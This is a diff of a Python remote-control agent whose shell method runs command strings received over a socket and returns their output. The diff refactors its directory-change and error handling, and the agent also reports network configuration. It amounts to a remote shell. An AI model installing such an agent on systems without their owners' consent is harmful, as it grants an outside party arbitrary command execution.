@@ -4,7 +4,6 @@ from platform import system as find_system
 import os
 from subprocess import check_output, DEVNULL, PIPE, run, Popen
 from secure_socket import Client, HOSTNAME
-from time import sleep
 
 class Computer:
   def shell(self, socket):
@@ -12,17 +11,20 @@ class Computer:
     socket.send(self.get_prompt())
     cmd=socket.receive()
     while cmd != 'exit':
+      out=''
       try:
-        output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
-        out=output.stdout.decode("utf-8")
-        err=output.stderr.decode("utf-8")
-        socket.send(f"{out}{err}")
-      except:
-        socket.send('')
-      sleep(0.1)
-      if cmd.split(' ')[0] == "cd":
-        os.chdir(cmd[3:])
-      socket.send(self.get_prompt())
+        if cmd=="cd":
+          os.chdir(self.get_env()[1])
+        elif cmd.startswith("cd ") and len(cmd[3:].strip())>0:
+          os.chdir(cmd[3:].strip())
+        else:
+          output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
+          out=output.stdout.decode("utf-8")
+          err=output.stderr.decode("utf-8")
+          out=f"{out}{err}"
+      except Exception as e:
+        out=str(e)
+      socket.send("*".join([self.get_prompt(), out]))
       cmd=socket.receive()
     os.chdir(origin)
 
@@ -30,17 +32,22 @@ class Linux(Computer):
   def ipconfig(self):
     return check_output(["ip", "a"]).decode('utf-8')
   
-  def get_prompt(self):
+  def get_env(self):
     user=os.getlogin()
     path=os.getcwd()
     if user=='root':
+      home='/root'
       end="#"
     else:
       home=f'/home/{user}'
-      if path.startswith(home):
-        path=home.join(path.split(home)[1:])
-        path=f"~{path}"
       end="$"
+    return [user, home, path, end]
+  
+  def get_prompt(self):
+    user, home, path, end = self.get_env()
+    if path.startswith(home):
+      path=home.join(path.split(home)[1:])
+      path=f"~{path}"
     return f"[{user}@{HOSTNAME}:{path}] {end} "
   
   def search(self, filename, path):
